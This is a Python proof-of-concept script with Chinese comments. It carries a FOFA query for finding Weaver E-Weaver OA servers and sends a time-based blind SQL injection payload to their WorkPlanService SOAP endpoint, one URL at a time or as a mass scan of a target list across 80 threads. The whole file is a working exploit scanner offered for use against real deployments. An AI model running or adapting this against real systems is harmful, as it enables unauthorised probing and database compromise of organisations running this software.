#fofa：app = 泛微-E-Weaver
#导包
import requests,sys,argparse,json,time
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """
     ____  ____  _       _  _         _  _____ ____  _____ 
/ ___\/  _ \/ \     / \/ \  /|   / |/  __//   _\/__ __\
|    \| / \|| |     | || |\ ||   | ||  \  |  /    / \  
\___ || \_\|| |_/\  | || | \||/\_| ||  /_ |  \_   | |  
\____/\____\\____/  \_/\_/  \|\____/\____\\____/  \_/  
                                                       


"""
    print()
#主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description="泛微 OA workplanservice SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

#poc函数
def poc(target):
    payload = '/services/WorkPlanService'
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36',
        'Content-Type': 'text/xml;charset=UTF-8',
        'Connection': 'close'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    data = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.workplan.weaver.com.cn">\n<soapenv:Header/> <soapenv:Body>\n<web:deleteWorkPlan>\n<!--type: string--> <web:in0>(SELECT 8544 FROM\n(SELECT(SLEEP(5-(IF(27=27,0,5)))))NZeo)</web:in0> <!--type: int-->\n<web:in1>22</web:in1> </web:deleteWorkPlan>\n</soapenv:Body> </soapenv:Envelope>'
    res = requests.post(url=target + payload,headers=headers,data=data,verify=False)
    #print(res.status_code)
    try:
        time = res.elapsed.total_seconds()
        if time >= 5:
            print(f'[+]{target}存在漏洞')
        else:
            print(f'[-]{target}不存在漏洞')
    except:
        print(target + '网站连接异常')

#函数入口
if __name__=="__main__":
    main()